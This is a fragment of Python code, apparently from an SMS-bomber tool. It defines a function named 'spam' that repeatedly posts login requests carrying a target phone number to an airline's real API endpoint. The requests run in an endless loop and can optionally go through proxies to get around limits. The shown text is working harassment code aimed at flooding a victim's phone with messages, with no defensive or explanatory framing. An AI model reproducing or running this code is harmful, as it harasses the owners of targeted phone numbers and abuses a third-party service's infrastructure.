    ...
    def main(self):
        ...
        def spam(thread_name='0', proxy=None):
            ...
            while True:
                try:
                    if proxy == None:
                        r = requests.post('https://b.utair.ru/api/v1/login/', data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'Accept-Language':'en-US,en;q=0.5', 'Connection':'keep-alive', 'Host':'b.utair.ru', 'origin':'https://www.utair.ru','Referer':'https://www.utair.ru/'})
                    else:
                        r = requests.post('https://b.utair.ru/api/v1/login/', data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'Accept-Language':'en-US,en;q=0.5', 'Connection':'keep-alive', 'Host':'b.utair.ru', 'origin':'https://www.utair.ru','Referer':'https://www.utair.ru/'}, proxies={'http': str(proxy), 'https': str(proxy)})
